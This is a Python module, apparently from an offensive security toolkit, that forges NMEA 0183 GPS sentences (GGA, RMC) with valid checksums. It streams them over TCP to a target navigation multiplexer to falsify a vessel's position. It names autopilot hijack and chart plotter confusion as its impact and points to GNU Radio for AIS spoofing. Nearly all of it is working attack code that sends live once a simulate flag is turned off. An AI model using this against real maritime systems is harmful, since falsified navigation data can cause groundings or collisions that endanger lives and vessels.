"""NMEA 0183/2000 sentence spoofing module.

Injects false GPS/navigation data into NMEA streams to manipulate
navigation systems and autopilots.

PREREQ HW: Serial connection to NMEA bus OR TCP access to NMEA multiplexer.

References:
- NMEA 0183 Standard (unauthenticated, no integrity check)
- Maritime cyber security research (BIMCO guidelines)
- Shodan NMEA exposed devices

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from __future__ import annotations

import socket
import time
from dataclasses import dataclass, field
from typing import Optional, List
import math


def nmea_checksum(sentence: str) -> str:
    """Calculate NMEA 0183 checksum (XOR of all bytes between $ and *).

    Args:
        sentence: NMEA sentence without $ prefix and * suffix.

    Returns:
        Two-digit hex checksum string.
    """
    cksum = 0
    for char in sentence:
        cksum ^= ord(char)
    return f"{cksum:02X}"


def build_gpgga(
    lat_dd: float,
    lon_dd: float,
    altitude_m: float = 0.0,
    satellites: int = 8,
    hdop: float = 1.2,
    time_utc: Optional[str] = None,
) -> str:
    """Build a GGA (Global Positioning System Fix) NMEA sentence.

    Args:
        lat_dd: Latitude in decimal degrees (positive = North).
        lon_dd: Longitude in decimal degrees (positive = East).
        altitude_m: Altitude in meters above MSL.
        satellites: Number of satellites in view.
        hdop: Horizontal dilution of precision.
        time_utc: UTC time string HHMMSS.ss (optional, uses 000000.00 if None).

    Returns:
        Complete NMEA GGA sentence with checksum.
    """
    if time_utc is None:
        time_utc = "000000.00"

    # Convert decimal degrees to NMEA format (DDDMM.MMMM)
    lat_abs = abs(lat_dd)
    lat_deg = int(lat_abs)
    lat_min = (lat_abs - lat_deg) * 60.0
    lat_hem = "N" if lat_dd >= 0 else "S"
    lat_str = f"{lat_deg:02d}{lat_min:07.4f}"

    lon_abs = abs(lon_dd)
    lon_deg = int(lon_abs)
    lon_min = (lon_abs - lon_deg) * 60.0
    lon_hem = "E" if lon_dd >= 0 else "W"
    lon_str = f"{lon_deg:03d}{lon_min:07.4f}"

    body = (
        f"GPGGA,{time_utc},{lat_str},{lat_hem},{lon_str},{lon_hem},"
        f"1,{satellites:02d},{hdop:.1f},{altitude_m:.1f},M,0.0,M,,"
    )
    return f"${body}*{nmea_checksum(body)}\r\n"


def build_gprmc(
    lat_dd: float,
    lon_dd: float,
    speed_knots: float = 0.0,
    course_deg: float = 0.0,
    time_utc: Optional[str] = None,
    date: Optional[str] = None,
) -> str:
    """Build an RMC (Recommended Minimum) NMEA sentence.

    Args:
        lat_dd: Latitude in decimal degrees.
        lon_dd: Longitude in decimal degrees.
        speed_knots: Speed over ground in knots.
        course_deg: True course over ground in degrees.
        time_utc: UTC time HHMMSS.ss.
        date: Date string DDMMYY.

    Returns:
        Complete NMEA RMC sentence with checksum.
    """
    if time_utc is None:
        time_utc = "000000.00"
    if date is None:
        date = "010101"

    lat_abs = abs(lat_dd)
    lat_deg = int(lat_abs)
    lat_min = (lat_abs - lat_deg) * 60.0
    lat_hem = "N" if lat_dd >= 0 else "S"
    lat_str = f"{lat_deg:02d}{lat_min:07.4f}"

    lon_abs = abs(lon_dd)
    lon_deg = int(lon_abs)
    lon_min = (lon_abs - lon_deg) * 60.0
    lon_hem = "E" if lon_dd >= 0 else "W"
    lon_str = f"{lon_deg:03d}{lon_min:07.4f}"

    body = (
        f"GPRMC,{time_utc},A,{lat_str},{lat_hem},{lon_str},{lon_hem},"
        f"{speed_knots:.1f},{course_deg:.1f},{date},,,A"
    )
    return f"${body}*{nmea_checksum(body)}\r\n"


def build_ais_vdm(
    mmsi: int,
    lat_dd: float,
    lon_dd: float,
    speed_knots: float = 0.0,
    course_deg: float = 0.0,
    msg_type: int = 1,
) -> str:
    """Build a simple AIS VDM sentence (Type 1/2/3 - Position Report).

    Note: Full AIS encoding requires bit-level packing. This is a simplified
    educational implementation. For production AIS spoofing, use GNU Radio
    with the gr-ais block.

    Args:
        mmsi: Maritime Mobile Service Identity (9 digits).
        lat_dd: Latitude in decimal degrees.
        lon_dd: Longitude in decimal degrees.
        speed_knots: Speed over ground in knots (0-102.2).
        course_deg: Course over ground in degrees (0-359.9).
        msg_type: AIS message type (1=Class A position).

    Returns:
        AIS VDM NMEA sentence string (simplified).
    """
    # AIS uses 1/10000 minute units for lat/lon
    lat_ais = int(lat_dd * 600000)
    lon_ais = int(lon_dd * 600000)
    sog = int(speed_knots * 10)  # 1/10 knot
    cog = int(course_deg * 10)  # 1/10 degree

    # Simplified - real implementation needs 6-bit ASCII encoding
    payload_info = (
        f"type={msg_type} mmsi={mmsi} lat={lat_dd:.6f} "
        f"lon={lon_dd:.6f} sog={speed_knots:.1f} cog={course_deg:.1f}"
    )
    # Return as comment - full bit encoding is out of scope for this module
    return f"!AIVDM,1,1,,A,,0*00  # {payload_info}\r\n"


class NMEASpoofAttack:
    """NMEA 0183 GPS/navigation data spoofing attack.

    Injects crafted NMEA sentences into exposed maritime navigation
    systems to manipulate autopilots, chart plotters, or AIS.

    Attributes:
        __info__: Module metadata.
    """

    __info__ = {
        "name": "NMEA 0183 Navigation Data Spoof",
        "category": "maritime",
        "protocol": "NMEA 0183",
        "transport": "TCP/UDP/Serial",
        "auth_required": False,
        "cwe": "CWE-306",
        "impact": "GPS position manipulation, autopilot hijack, chart plotter confusion",
        "hw_req": [
            "Network access to NMEA multiplexer (common port: 10110)",
            "OR serial/RS-422 connection to NMEA 0183 bus",
        ],
        "note": "Most NMEA 0183 implementations have no authentication or integrity check.",
        "references": [
            "BIMCO Guidelines on Cyber Security",
            "MarSecCon 2019: GPS Spoofing at Sea",
        ],
    }

    def __init__(
        self,
        target_host: str = "192.168.1.1",
        target_port: int = 10110,
        fake_lat: float = -23.5505,
        fake_lon: float = -46.6333,
        fake_speed: float = 0.0,
        simulate: bool = True,
    ) -> None:
        """Initialize NMEA spoof attack.

        Args:
            target_host: IP address of NMEA multiplexer/server.
            target_port: TCP port (common: 10110, 2000).
            fake_lat: Spoofed latitude in decimal degrees.
            fake_lon: Spoofed longitude in decimal degrees.
            fake_speed: Spoofed speed over ground in knots.
            simulate: If True, shows sentences without sending.
        """
        self.target_host = target_host
        self.target_port = target_port
        self.fake_lat = fake_lat
        self.fake_lon = fake_lon
        self.fake_speed = fake_speed
        self.simulate = simulate

    def build_sentences(self) -> List[str]:
        """Build the set of NMEA sentences to inject.

        Returns:
            List of NMEA sentence strings.
        """
        return [
            build_gpgga(self.fake_lat, self.fake_lon, altitude_m=10.0),
            build_gprmc(self.fake_lat, self.fake_lon, speed_knots=self.fake_speed),
        ]

    def run(self, duration_seconds: int = 10) -> dict:
        """Execute the NMEA spoofing attack.

        Args:
            duration_seconds: How long to inject fake data.

        Returns:
            Result dict with status and sent/simulated sentences.
        """
        sentences = self.build_sentences()

        if self.simulate:
            return {
                "simulated": True,
                "target": f"{self.target_host}:{self.target_port}",
                "fake_position": {"lat": self.fake_lat, "lon": self.fake_lon},
                "sentences": sentences,
                "note": "Set simulate=False to send to live target",
            }

        sent_count = 0
        try:
            with socket.create_connection((self.target_host, self.target_port), timeout=5) as sock:
                end_time = time.time() + duration_seconds
                while time.time() < end_time:
                    for sentence in sentences:
                        sock.sendall(sentence.encode("ascii"))
                        sent_count += 1
                    time.sleep(1)
        except (OSError, ConnectionRefusedError) as exc:
            return {"error": str(exc), "sent": sent_count}

        return {
            "success": True,
            "target": f"{self.target_host}:{self.target_port}",
            "sentences_sent": sent_count,
            "duration_s": duration_seconds,
        }
